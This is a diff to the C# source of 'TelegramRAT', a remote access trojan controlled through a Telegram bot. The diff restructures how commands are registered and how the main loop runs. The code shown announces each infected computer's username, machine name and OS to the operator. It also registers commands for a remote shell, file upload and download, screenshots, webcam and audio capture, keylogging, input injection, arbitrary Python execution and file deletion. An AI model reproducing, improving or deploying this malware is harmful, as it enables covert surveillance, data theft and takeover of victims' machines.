@@ -24,6 +24,7 @@ using Microsoft.Scripting.Interpreter;
 using Microsoft.Scripting.Hosting;
 using Microsoft.Win32;
 
+
 namespace TelegramRAT
 {
     public static class Program
@@ -50,19 +51,129 @@ namespace TelegramRAT
             string thisprocessname = Process.GetCurrentProcess().ProcessName;
 
             if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
+            {
+                Console.WriteLine("Only one instance could be online at the same time!");
                 return;
+            }
 
             Bot = new TelegramBotClient(BotToken);
 
             pythonRuntime = Python.CreateRuntime();
-
             pythonEngine = Python.CreateEngine();
-
             pythonScope = pythonRuntime.CreateScope();
 
-            #region Commands
+            InitializeCommands(commands);
+
+            try
+            {
+                Run().Wait();
+            }
+            catch (Exception ex)
+            {
+                Bot.SendTextMessageAsync(OwnerId, "Error occured! - " + ex.Message);
+                Bot.SendTextMessageAsync(OwnerId, "Attempting to restart. Please wait...");
+                Main(null);
+            }
+
+        }
+
+        static async void ReportError(Update update, Exception exception)
+        {
+#if DEBUG
+            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Error: \"" + exception.Message + "\" at \"" + exception.StackTrace + "\"", replyToMessageId: update.Message.MessageId);
+#else
+            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Error: " + exception.Message, replyToMessageId: update.Message.MessageId);
+#endif
+        }
+
+
+
+        static async Task Run()
+        {
+            if (OwnerId != null)
+            {
+                await Bot.SendTextMessageAsync(OwnerId,
+                    $"Computer online! \n\n" +
+
+                    $"Username: <b>{Environment.UserName}</b>\n" +
+                    $"PC name: <b>{Environment.MachineName}</b>\n\n" +
+
+                    $"OS: {GetWindowsVersion()}",
+                    ParseMode.Html);
+            }
+            var offset = 0;
+
+            while (true)
+            {
+                var updates = await Bot.GetUpdatesAsync(offset);
+                if (updates.Length != 0)
+                    offset = updates.Last().Id + 1;
+
+                UpdateWorker(updates).Wait();
+
+                Task.Delay(1000).Wait();
+            }
+
+        }
+
+
+        public static async Task UpdateWorker(Update[] Updates)
+        {
+            foreach (var update in Updates)
+            {
+                if (update.Message == null || (update.Message.Text == null && update.Message.Caption == null))
+                {
+                    continue;
+                }
+
+                string messageText = update.Message.Type == MessageType.Text ? update.Message.Text : update.Message.Caption;
+
+                BotCommandModel model = BotCommand.Parse(messageText);
+
+                if (model == null)
+                    continue;
+
+                foreach (var cmd in commands)
+                {
+                    if (cmd.Command == model.Command)
+                    {
+                        if ((cmd.IgnoreCountArgs || cmd.CountArgs != 0) && model.Args.Length != 0)
+                        {
+                            cmd.Execute.Invoke(model, update);
+                        }
+                        else if (!(cmd.IgnoreCountArgs || cmd.CountArgs != 0) || cmd.MayHaveNoArgs)
+                        {
+                            cmd.Execute.Invoke(model, update);
+                        }
+                        else
+                        {
+                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command requires arguments! \n\n" +
+                                 $"To get information about this command - type /help {model.Command.Substring(1)}", replyToMessageId: update.Message.MessageId);
+                        }
+                        continue;
+                    }
+                }
+            }
+        }
+
+
+        static string GetWindowsVersion()
+        {
+            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
+            if (key != null)
+            {
+                string prodName = key.GetValue("ProductName") as string;
+                string csdVer = key.GetValue("CSDVersion") as string;
+
+                return prodName + csdVer;
+            }
+            return "";
+        }
+
+        static void InitializeCommands(List<BotCommand> CommandsList)
+        {
             //HELP
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/help",
                 IgnoreCountArgs = true,
@@ -117,7 +228,7 @@ namespace TelegramRAT
             });
 
             //CMD
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/cmd",
                 IgnoreCountArgs = true,
@@ -159,7 +270,7 @@ namespace TelegramRAT
             });
 
             //DIR
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/dir",
                 CountArgs = 0,
@@ -234,7 +345,7 @@ namespace TelegramRAT
             });
 
             //PROCESSESLIST
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/processes",
                 CountArgs = 0,
@@ -270,7 +381,7 @@ namespace TelegramRAT
             });
 
             //PROCESSKILL
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/processkill",
                 IgnoreCountArgs = true,
@@ -298,7 +409,7 @@ namespace TelegramRAT
             });
 
             //CD
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/cd",
                 IgnoreCountArgs = true,
@@ -322,7 +433,7 @@ namespace TelegramRAT
             });
 
             //CURDIR
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/curdir",
                 CountArgs = 0,
@@ -342,7 +453,7 @@ namespace TelegramRAT
             });
 
             //SHUTDOWN
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/power",
                 CountArgs = 1,
@@ -372,7 +483,7 @@ namespace TelegramRAT
             });
 
             //RESTART
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/restart",
                 CountArgs = 0,
@@ -400,7 +511,7 @@ namespace TelegramRAT
             });
 
             //DOWNLOAD
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/download",
                 IgnoreCountArgs = true,
@@ -431,7 +542,7 @@ namespace TelegramRAT
             });
 
             //SCREENSHOT
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/screenshot",
                 CountArgs = 0,
@@ -474,7 +585,7 @@ namespace TelegramRAT
             });
 
             //GET USER TELEGRAM ID
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/getid",
                 CountArgs = 0,
@@ -492,7 +603,7 @@ namespace TelegramRAT
             });
 
             //TAKE PHOTO FROM WEBCAM
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/webcam",
                 Description = "Take a photo from webcamera.",
@@ -531,7 +642,7 @@ namespace TelegramRAT
             });
 
             //MESSAGEBOX
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/message",
                 IgnoreCountArgs = true,
@@ -548,7 +659,7 @@ namespace TelegramRAT
             });
 
             //OPENURL
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/openurl",
                 IgnoreCountArgs = true,
@@ -574,7 +685,7 @@ namespace TelegramRAT
             });
 
             //UPLOAD FILE TO PC
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/upload",
                 IgnoreCountArgs = true,
@@ -636,7 +747,7 @@ namespace TelegramRAT
             });
 
             //RECORD VIDEO FROM WEBCAM
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/video",
                 CountArgs = 1,
@@ -688,7 +799,7 @@ namespace TelegramRAT
             });
 
             //SEND KEYBOARD INPUT 
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/sendinput",
                 IgnoreCountArgs = true,
@@ -739,11 +850,11 @@ namespace TelegramRAT
                     });
                 },
 
-               
+
             });
 
             //CHANGE WALLPAPER
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/wallpaper",
                 Description = "Change wallpapers. Don't foreget to attach the image.",
@@ -804,7 +915,7 @@ namespace TelegramRAT
             });
 
             //MINIMIZE WINDOW
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/minimize",
                 MayHaveNoArgs = false,
@@ -836,7 +947,7 @@ namespace TelegramRAT
             });
 
             //MAXIMIZE WINDOW
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/maximize",
                 MayHaveNoArgs = false,
@@ -860,7 +971,7 @@ namespace TelegramRAT
             });
 
             //RESTORE WINDOW
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/restore",
                 MayHaveNoArgs = false,
@@ -886,7 +997,7 @@ namespace TelegramRAT
             });
 
             //CLOSE WINDOW
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/close",
                 MayHaveNoArgs = false,
@@ -913,7 +1024,7 @@ namespace TelegramRAT
             });
 
             //SET FOCUS
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/setfocus",
                 MayHaveNoArgs = false,
@@ -939,7 +1050,7 @@ namespace TelegramRAT
             });
 
             //WINDOW INFO
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/windowinfo",
                 Description = "Information about window by name, or top window if name wasn't provided",
@@ -998,7 +1109,7 @@ namespace TelegramRAT
             });
 
             //MOVE MOUSE TO COORD
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/mouseto",
                 CountArgs = 2,
@@ -1026,7 +1137,7 @@ namespace TelegramRAT
             });
 
             //MOVE MOUSE BY PIXELS
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/mouseby",
                 CountArgs = 2,
@@ -1051,7 +1162,7 @@ namespace TelegramRAT
             });
 
             //CLICK LEFT MOUSE BUTTON
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/lmclick",
                 Description = "Simulate left mouse click.",
@@ -1063,7 +1174,7 @@ namespace TelegramRAT
             });
 
             //DOUBLECLICK LEFT MOUSE BUTTON
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/dlmclick",
                 Description = "Simulate double left mouse click.",
@@ -1075,7 +1186,7 @@ namespace TelegramRAT
             });
 
             //CLICK RIGHT MOUSE BUTTON
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/rmclick",
                 Description = "Simulate right mouse click.",
@@ -1087,7 +1198,7 @@ namespace TelegramRAT
             });
 
             //SEND TEXT INPUT
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/sendtext",
                 IgnoreCountArgs = true,
@@ -1112,7 +1223,7 @@ namespace TelegramRAT
             });
 
             //KEYLOG
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/keylog",
                 Execute = (model, update) =>
@@ -1193,7 +1304,7 @@ namespace TelegramRAT
             });
 
             //RECORD AUDIO
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/audio",
                 CountArgs = 1,
@@ -1316,7 +1427,7 @@ namespace TelegramRAT
             });
 
             //GET ALL COMMANDS
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/commands",
                 Description = "Get all commands list sorted by alphabet",
@@ -1337,7 +1448,7 @@ namespace TelegramRAT
             });
 
             //DELETE FILE
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/deletefile",
                 MayHaveNoArgs = false,
@@ -1368,7 +1479,7 @@ namespace TelegramRAT
             });
 
             //CREATE FOLDER
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/createfolder",
                 MayHaveNoArgs = false,
@@ -1399,7 +1510,7 @@ namespace TelegramRAT
             });
 
             //DELETE FOLDER
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/deletefolder",
                 MayHaveNoArgs = false,
@@ -1428,7 +1539,7 @@ namespace TelegramRAT
             });
 
             //RENAME FILE
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/renamefile",
                 Description = "Rename file. First argument must be path (full or relative) for file. Second argument must contain only new name.",
@@ -1463,7 +1574,7 @@ namespace TelegramRAT
             });
 
             //COPY FILE
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/copyfile",
                 CountArgs = 2,
@@ -1496,7 +1607,7 @@ namespace TelegramRAT
             });
 
             //PYTHON COMMANDS EXECUTING
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/py",
                 Description = "Execute python expression or file. To execute file send it and reply to it with command /py. Mind that all expressions and files execute in the same script scope. To clear scope /pyclearscope",
@@ -1574,7 +1685,7 @@ namespace TelegramRAT
             });
 
             //PYTHON CLEAR SCOPE
-            commands.Add(new BotCommand
+            CommandsList.Add(new BotCommand
             {
                 Command = "/pyclearscope",
                 CountArgs = 0,
@@ -1591,161 +1702,6 @@ namespace TelegramRAT
             });
 
 
-            #endregion
-
-
-            for (; ; )
-            {
-                try
-                {
-                    Run().Wait();
-                }
-                catch (Exception ex)
-                {
-                    Bot.SendTextMessageAsync(OwnerId, "Error occured! - " + ex.Message);
-                }
-            }
-        }
-
-        static async void ReportError(Update update, Exception exception)
-        {
-            if (Bot != null)
-            {
-#if DEBUG
-                await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Error: \"" + exception.Message + "\" at \"" + exception.StackTrace + "\"", replyToMessageId: update.Message.MessageId);
-#else
-                await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Error: " + exception.Message, replyToMessageId: update.Message.MessageId);
-#endif
-            }
-        }
-
-
-
-        static async Task Run()
-        {
-            if (OwnerId != null)
-            {
-                await Bot.SendTextMessageAsync(OwnerId,
-                    $"🖥Computer online! \n\n" +
-                    $"Username: *{Environment.UserName}*\n" +
-                    $"PC name: *{Environment.MachineName}*\n\n" +
-
-                    $"OS: {GetWindowsVersion()}",
-                    ParseMode.Markdown);
-            }
-            var offset = 0;
-
-            while (true)
-            {
-                var updates = await Bot.GetUpdatesAsync(offset);
-                if (updates.Length != 0)
-                    offset = updates.Last().Id + 1;
-
-                UpdateWorker(updates).Wait();
-
-                Task.Delay(100).Wait();
-            }
-
-        }
-
-
-        public static async Task UpdateWorker(Update[] Updates)
-        {
-
-            foreach (var update in Updates)
-            {
-                if (update.Message == null || (update.Message.Text == null && update.Message.Caption == null))
-                {
-                    continue;
-                }
-                if (update.Message.Text != null && update.Message.Text.Contains("@" + Bot.GetMeAsync().Result.Username))
-                {
-                    update.Message.Text = update.Message.Text.Substring(0,
-                        update.Message.Text.IndexOf("@" + Bot.GetMeAsync().Result.Username)) +
-                        update.Message.Text.Substring(
-                        update.Message.Text.IndexOf("@" + Bot.GetMeAsync().Result.Username) +
-                        ("@" + Bot.GetMeAsync().Result.Username).Length);
-                }
-
-                if (update.Message.Caption != null && update.Message.Caption.Contains("@" + Bot.GetMeAsync().Result.Username))
-                {
-                    update.Message.Caption = update.Message.Text.Substring(0,
-                        update.Message.Caption.IndexOf("@" + Bot.GetMeAsync().Result.Username)) +
-                        update.Message.Caption.Substring(
-                        update.Message.Caption.IndexOf("@" + Bot.GetMeAsync().Result.Username) +
-                        ("@" + Bot.GetMeAsync().Result.Username).Length);
-                }
-
-                BotCommandModel model;
-                if (update.Message.Type == MessageType.Text)
-                {
-                    model = BotCommand.Parse(update.Message.Text);
-                }
-                else
-                {
-                    model = BotCommand.Parse(update.Message.Caption);
-                }
-                if (model != null)
-                {
-                    foreach (var cmd in commands)
-                    {
-                        if (cmd.Command == model.Command)
-                        {
-
-                            if ((cmd.IgnoreCountArgs || cmd.CountArgs != 0) && model.Args.Length != 0)
-                            {
-                                await Task.Run(() =>
-                                {
-                                    try
-                                    {
-                                        cmd.Execute.Invoke(model, update);
-                                    }
-                                    catch (Exception ex)
-                                    {
-                                        ReportError(update, ex);
-                                    }
-                                });
-
-                            }
-                            else if (!(cmd.IgnoreCountArgs || cmd.CountArgs != 0) || cmd.MayHaveNoArgs)
-                            {
-
-                                await Task.Run(() =>
-                                {
-                                    try
-                                    {
-                                        cmd.Execute.Invoke(model, update);
-                                    }
-                                    catch (Exception ex)
-                                    {
-                                        ReportError(update, ex);
-                                    }
-                                });
-                            }
-                            else
-                            {
-                                await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command requires arguments! \n\n" +
-                                     $"To get information about this command - type /help {model.Command.Substring(1)}", replyToMessageId: update.Message.MessageId);
-                            }
-                        }
-                    }
-                }
-
-            }
-        }
-
-
-        static string GetWindowsVersion()
-        {
-            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
-            if (key != null)
-            {
-                string prodName = key.GetValue("ProductName") as string;
-                string csdVer = key.GetValue("CSDVersion") as string;
-
-                return prodName + csdVer;
-            }
-            return "";
         }
     }
 }
